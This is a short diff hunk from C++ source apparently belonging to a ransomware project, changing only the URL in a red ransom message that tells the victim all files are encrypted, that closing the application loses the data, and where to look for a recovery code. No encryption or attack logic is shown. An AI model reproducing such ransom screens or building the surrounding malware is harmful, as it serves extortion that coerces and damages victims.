@@ -70,7 +70,7 @@ int main()
     std::cout << "\033[0;31m";
     std::cout << "/!\\ All files have been ENCRYPTED:\n";
     std::cout << "If you close this application, your data will be lost...\n\n";
-    std::cout << "If you want to find your data, search for the code on the site: https://antoinelandrieux.github.io/Ransomware\n";
+    std::cout << "If you want to find your data, search for the code on the site: https://github.com/AntoineLandrieux/Ransomware\n";
 
     std::string code = "";
 
